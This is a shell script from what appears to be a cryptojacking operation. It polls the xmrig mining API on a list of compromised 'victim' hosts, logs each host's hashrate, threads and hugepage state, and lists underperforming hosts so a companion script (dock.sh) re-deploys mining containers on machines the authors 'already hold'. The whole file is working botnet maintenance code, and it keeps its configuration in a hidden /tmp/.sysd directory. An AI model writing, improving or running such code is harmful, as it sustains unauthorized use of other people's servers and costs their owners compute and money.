#!/bin/sh
# ============================================================================
# victim.sh - per-victim PRODUCTION truth.
#
# Why: nothing else could answer "is this host actually mining?". The pool's API is
# unreachable from box1, and /containers/<id>/logs and exec-start both return EMPTY on
# this population - so existence was the only signal, and a 1-thread container on a
# 64 vCPU box looks exactly like a working one. Every container we deploy now
# publishes xmrig's own API on :47999, so the host's IP answers /2/summary with real
# H/s, thread count and hugepage state.
#
# Output:
#   .hunt/fleet.hosts.tsv   epoch<TAB>ip<TAB>hs<TAB>threads<TAB>hp_used/hp_total
#   .hunt/heal.list         hosts that answer :47999 but produce ~nothing
#
# heal.list is the input to the auto-heal: dock.sh treats a listed host as stale and
# re-creates it (replace-then-remove), which is how a bad config reaches a host we
# already hold.
#
# usage: victim.sh            (timer: every 5 min)
# ============================================================================
set -eu

SELF_DIR=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
SYSDIR="${SYSDIR:-/tmp/.sysd}"
[ -r "$SYSDIR/worker.env" ] && . "$SYSDIR/worker.env"
WORK="${HUNT_WORK:-$SELF_DIR/.hunt}"
mkdir -p "$WORK" 2>/dev/null || :
LIVE="$WORK/dock.live"
OUT="$WORK/fleet.hosts.tsv"
HEAL="$WORK/heal.list"
DEAD="$WORK/dock.dead"
NOW=$(date +%s)
# A core yields roughly 400-900 H/s. Below this fraction of (threads x 400) the host
# is suspect: light mode on a big box, throttled cgroup, or a dead dataset.
FLOOR="${VICTIM_FLOOR:-250}"

[ -s "$LIVE" ] || { echo "victim: no live hosts"; exit 0; }
recent=$(awk -v t="$NOW" -F'\t' '$2 > t - 43200 { print $1 }' "$LIVE" 2>/dev/null | sort -u)
[ -n "$recent" ] || { echo "victim: no host seen live in 12h"; exit 0; }

: > "$HEAL"
n=0; ok=0; zero=0; silent=0; prod=0
for ip in $recent; do
    n=$((n + 1))
    if [ -s "$DEAD" ] && grep -qxF "$ip" "$DEAD" 2>/dev/null; then continue; fi
    s=$(curl -sS -m 5 "http://$ip:47999/2/summary" 2>/dev/null) || s=""
    if [ -z "$s" ]; then
        silent=$((silent + 1))
        printf '%s\t%s\tsilent\t0\t0/0\n' "$NOW" "$ip" >> "$OUT"
        continue
    fi
    hs=$(printf '%s' "$s" | tr -d ' "' | grep -o 'total:\[[0-9.]*' | head -1 | cut -d: -f2 | cut -d[ -f2)
    thr=$(printf '%s' "$s" | tr -d ' "' | grep -o '"threads":[0-9]*' | head -1 | cut -d: -f2)
    hp=$(printf '%s' "$s" | tr -d ' "' | grep -o 'hugepages:\[[0-9,]*,*[0-9]*\]' | head -1 | tr -d 'hugepages:[]')
    [ -n "$hs" ] || hs=0
    printf '%s\t%s\t%s\t%s\t%s\n' "$NOW" "$ip" "$hs" "${thr:-0}" "${hp:-0/0}" >> "$OUT"
    if [ "${hs%%.*}" -ge "$FLOOR" ]; then
        ok=$((ok + 1))
    else
        zero=$((zero + 1))
        printf '%s\n' "$ip" >> "$HEAL"
    fi
    [ "${hs%%.*}" -ge 1000 ] && prod=$((prod + 1))
done
echo "victim: probed $n | producing(>=${FLOOR}H/s) $ok | near-zero $zero | api silent $silent | >=1kH/s $prod"
echo "victim: heal.list $(wc -l < "$HEAL") host(s) - dock.sh re-creates listed hosts"
